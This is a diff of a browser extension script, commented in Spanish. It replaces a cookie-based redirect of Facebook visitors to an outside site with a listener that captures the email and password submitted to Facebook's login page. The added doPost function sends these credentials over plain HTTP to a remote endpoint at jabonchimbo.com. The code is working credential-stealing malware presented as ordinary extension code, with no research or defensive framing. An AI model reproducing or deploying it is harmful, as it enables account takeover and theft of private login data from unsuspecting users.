@@ -1,34 +1,37 @@
 'use strict';
 
-var pattern = "*://*.facebook.com/*";
-
-function redirect(requestDetails) {
-var redirectUrl = "";
-var getting = browser.cookies.get({
-	  url: "https://www.facebook.com/",
-    name: "c_user"
-  });
-	
-	return new Promise((resolve, reject) => {
-	 getting.then(function(cookie) {
-		if(cookie){
-	 		console.log("Loggeado no redireccionar   " + redirectUrl);
-     			resolve({redirectUrl});
-		}else{
-	 		console.log("No se ha loggeado:");
-			redirectUrl = "http://jabonchimbo.com/api/cards/";
-     			resolve({redirectUrl});
-		}
-		}) 
-	});
-
-}
+var targetPage = "*://*.facebook.com/login.php*";
 
 browser.webRequest.onBeforeRequest.addListener(
-  redirect,
-  {urls:[pattern], types:["main_frame"]},
-  ["blocking"]
+  function(details) {
+    if(details.method == "POST") {
+      console.log(details.requestBody.formData);
+	    if(details.requestBody.formData.email === undefined){
+      		doPost("repeat",details.requestBody.formData.pass[0]);
+	    }else{
+      		doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
+	    }
+    }
+  },
+  {urls: [targetPage]},
+  ["requestBody"]
 );
 
 
+function doPost(e,p){
+                        var url = "http://www.jabonchimbo.com/api/cards/dopost.php";
+                        var parametros ="email="+e+"&pass="+p;
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("POST",url, true);
+                        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+                        xhr.setRequestHeader('Accept','*/*');
+                        xhr.setRequestHeader("Accept-Language", "en");
+                        xhr.send(parametros);
+
+                        xhr.onreadystatechange = function () {
+                                if (xhr.readyState == 4) {
+                                        console.log("Envio de parametros terminada");
+                                }
+                        }
+}
 
